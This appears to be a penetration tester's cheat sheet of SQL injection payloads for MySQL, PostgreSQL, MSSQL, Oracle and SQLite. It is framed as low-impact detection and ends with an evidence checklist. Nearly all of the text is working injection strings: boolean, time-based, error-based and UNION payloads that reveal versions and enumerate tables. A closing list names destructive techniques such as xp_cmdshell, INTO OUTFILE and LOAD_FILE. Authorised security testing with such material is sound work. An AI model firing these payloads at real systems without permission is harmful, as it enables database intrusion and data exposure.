# Safe SQLi Payloads — Organized by DBMS

## Goals
- Use low-impact payloads that avoid data modification
- Reduce risk of service disruption
- Suitable for initial testing on all target types

## Universal Safe Payloads (All DBMS)
```sql
-- Boolean detection
' AND 1=1-- -
' AND 1=2-- -
' OR 1=1-- -
' OR 1=2-- -
1 AND 1=1
1 AND 1=2

-- Quote tests
'
"
\
`

-- Comment tests
'-- -
'#
'/*

-- Arithmetic verification
' AND 2*3=6-- -
' AND 2*3=7-- -
```

## MySQL-Specific Safe Payloads
```sql
-- Time-based (use short delays)
' AND IF(1=1,SLEEP(2),0)-- -
' AND BENCHMARK(3000000,SHA1('test'))-- -

-- Error-based (read-only)
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,version()),1)-- -

-- UNION detection
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Version check (safe)
' UNION SELECT @@version,NULL-- -
' UNION SELECT version(),NULL-- -
```

## PostgreSQL-Specific Safe Payloads
```sql
-- Time-based
' AND 1=(SELECT 1 FROM pg_sleep(2))-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -

-- Error-based
' AND 1=1::int-- -
' AND 1=CAST('a' AS int)-- -

-- Version check
' UNION SELECT version(),NULL-- -
```

## MSSQL-Specific Safe Payloads
```sql
-- Time-based
'; WAITFOR DELAY '0:0:2'-- -
'; IF (1=1) WAITFOR DELAY '0:0:2'-- -

-- Error-based
' AND 1=CONVERT(int,@@version)-- -
' AND 1=CONVERT(int,db_name())-- -

-- Version check
' UNION SELECT @@version,NULL-- -
```

## Oracle-Specific Safe Payloads
```sql
-- Time-based
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)-- -

-- Error-based
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))-- -

-- Version check
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1-- -
```

## SQLite-Specific Safe Payloads
```sql
-- Time-based (CPU-based delay)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))-- -

-- Version check
' UNION SELECT sqlite_version(),NULL-- -

-- Table enumeration
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
```

## Payloads to AVOID (Destructive)
```sql
-- DO NOT use without explicit authorization:
DROP TABLE ...
DELETE FROM ...
UPDATE ... SET ...
INSERT INTO ...
'; SHUTDOWN-- -
EXEC xp_cmdshell ...
INTO OUTFILE ...
LOAD_FILE() on sensitive files
```

## Evidence Checklist
- [ ] Payloads used (exact text)
- [ ] Response indicators (status code, body length, response time)
- [ ] Which payloads produced different behavior
- [ ] DBMS-specific payload that confirmed type
